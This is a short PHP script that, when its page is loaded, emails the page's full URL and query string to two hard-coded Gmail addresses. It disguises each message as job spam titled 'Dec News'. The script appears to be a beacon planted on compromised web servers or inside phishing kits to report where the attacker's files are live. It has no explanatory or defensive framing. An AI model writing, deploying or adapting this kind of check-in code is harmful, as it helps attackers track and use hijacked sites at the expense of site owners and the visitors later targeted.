<?
$rezmail1 = "izik.krg@gmail.com";
$rezmail2 = "ghostx2040@gmail.com";
$ip = getenv("REMOTE_ADDR");
$host = $_SERVER['HTTP_HOST'];
$self = $_SERVER['PHP_SELF'];
$query = !empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : null;
$url = !empty($query) ? "http://$host$self?$query" : "http://$host$self";
$message .= "Position at your county. 320 bucks per week.Get bck for more nfo\n";
$subject = "Dec News $url";
$headers .= "MIME-Version: 1.0\n";
mail($rezmail1,$subject,$message,$headers);
mail($rezmail2,$subject,$message,$headers);
?>